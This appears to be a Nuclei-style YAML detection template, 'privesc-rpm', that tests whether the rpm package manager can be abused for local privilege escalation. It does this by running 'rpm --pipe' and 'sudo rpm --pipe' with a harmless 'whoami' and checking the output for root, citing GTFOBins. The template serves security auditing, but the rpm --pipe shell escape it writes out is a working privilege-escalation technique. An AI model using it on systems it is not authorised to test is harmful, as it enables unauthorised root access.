code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'rpm --pipe ''whoami 0<&1''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo rpm --pipe ''whoami 0<&1''

    '
id: privesc-rpm
info:
  author: daffainfo
  description: 'rpm stands for "Red Hat Package Manager." It is a command-line package
    management utility used in Red Hat-based Linux distributions to install, update,
    and manage software packages. rpm is also used to query package information, verify
    package integrity, and perform various administrative tasks related to software
    packages.

    '
  metadata:
    max-request: 3
    verified: true
  name: rpm - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/rpm/
  severity: high
  tags: code,linux,rpm,privesc,local
self-contained: true
